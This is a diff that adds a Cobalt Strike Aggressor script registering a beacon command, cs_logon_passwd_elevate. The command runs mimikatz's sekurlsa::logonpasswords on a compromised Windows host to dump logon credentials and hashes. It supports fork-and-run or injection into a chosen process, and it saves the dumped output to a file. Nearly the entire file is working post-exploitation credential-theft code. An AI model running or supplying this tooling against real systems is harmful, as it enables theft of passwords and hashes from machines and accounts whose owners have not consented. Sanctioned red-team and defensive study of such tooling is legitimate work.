@@ -1,0 +1,122 @@
+
+# Save the output to the specified file
+#
+# Arguments
+# $1 - beacon id
+# $2 - result
+# $3 - info - Map containing information about the result
+# $4 - opts - Map containing information about the command that was ran
+#
+sub save_output {
+   # Declare local variables
+   local('$bid $result %info %opts $handle');
+
+   # Assign parameters user friendly names
+   ($bid, $result, %info, %opts) = @_;
+   #println("**** save_output for bmimikatz");
+   #println("**** arg1 (bid): $bid");
+   #println("**** arg2 (result):\n$result");
+   #println("**** arg3 (info): " . %info);
+   #println("**** arg4 (opts): " . %opts);
+
+   # Save the result to the specified file
+   $handle = openf(">" . %opts["--file"]);
+   println($handle, $result);
+   closef($handle);
+
+   # Log that the output has been saved to the beacon console using the alt method
+   blog2($bid, "Output from " . %opts["--command"] . " is saved at " . %opts["--file"] . "\n");
+
+   #println("**** save_output done");
+}
+
+
+beacon_command_register(
+   "cs_logon_passwd_elevate",
+   "Dump credentials and hashes with mimikatz: !sekurlsa::logonpasswords",
+
+   "Dump credentials and hashes with mimikatz: !sekurlsa::logonpasswords\n\n" .
+
+   "Usage:\n" .
+   "   cs_logon_passwd_elevate [options]\n\n" .
+
+   "Arguments:\n" .
+   "   \$1 - beacon id (CS automatically adds this argument)\n\n" .
+
+   "Options (specified in any order):\n" .
+   "   --file <file>        - save output to the file\n" .
+   "   --pid <pid>          - pid to inject into or use for fork&run\n" .
+   "   --arch <arch>        - arch of the pid to inject into use for fork&run\n\n" .
+
+   "Examples (fork and run):\n" .
+   "   cs_logon_passwd_elevate\n" .
+   "   cs_logon_passwd_elevate --file /tmp/mkatz.password\n\n" .
+
+   "Examples (process injection):\n" .
+   "   cs_logon_passwd_elevate --pid 1234 --arch x64\n".
+   "   cs_logon_passwd_elevate --pid 1234 --arch x64 --file /tmp/mkatz.password\n\n"
+);
+
+alias cs_logon_passwd_elevate {
+   # Declare local variables
+   local('$bid @valid_opts %opts $opt_cnt $opt_ind $opt $value $info');
+
+   # Assign parameters to the opts hash map
+   $bid = @_[0];
+   $opt_cnt = size(@_);
+   @valid_opts = @("--file", "--pid", "--arch");
+   for($opt_ind = 1; $opt_ind < $opt_cnt; $opt_ind++) {
+      # Set the arg and value for this iteration
+      $opt = @_[$opt_ind];
+      $opt_ind++;
+      $value = iff( $opt_ind >= $opt_cnt, $null, @_[$opt_ind] );
+
+      # Do some simple validation on opt and value
+      if ($opt !in @valid_opts) {
+         berror($bid, "$opt is not a valid option.");
+         return;
+      }
+      if ($value is $null || $value in @valid_opts) {
+         berror($bid, "Missing or invalid value for the $opt option.");
+         return;
+      }
+
+      # Save the opt and value into the opts hash
+      %opts[$opt] = $value;
+   }
+
+   # Validate options
+   if ( (%opts["--pid"] !is $null) || (%opts["--arch"] !is $null) ) {
+      # At least one process injection options is used, validate them.
+      if (!-isnumber %opts["--pid"] || %opts["--pid"] < 0) {
+         berror($bid, "pid is not a valid: " . %opts["--pid"]);
+         return;
+      }
+      if (%opts["--arch"] !in @("x86", "x64")) {
+         berror($bid, "arch is not valid, must be x86 or x64.");
+         return;
+      }
+   }
+
+   # Set the command to use in the opts hash map
+   %opts["--command"] = "!sekurlsa::logonpasswords";
+
+   # Build the info message to use later to info to the script console
+   $info = "beacon: $bid will execute \'" . %opts["--command"] . "\'";
+   if (%opts["--pid"] >= 0 && %opts["--arch"] in @("x86", "x64")) {
+      $info .= " using process injection: \(\'" . %opts["--pid"] . "\' \'" . %opts["--arch"] . "\'\)";
+   } else {
+      $info .= " using fork&run";
+   }
+
+   # Execute the command
+   if (%opts["--file"] eq $null) {
+      println("$info");
+      bmimikatz_small($bid, %opts["--command"], %opts["--pid"], %opts["--arch"]);
+   } else {
+      println("$info and save the output to " . %opts["--file"]);
+      # Use the lambda function in order to pass local variables via Pass by Name to the callback
+      bmimikatz_small($bid, %opts["--command"], %opts["--pid"], %opts["--arch"],
+         lambda({ save_output($1, $2, $3, %opts); }, \%opts));
+   }
+}
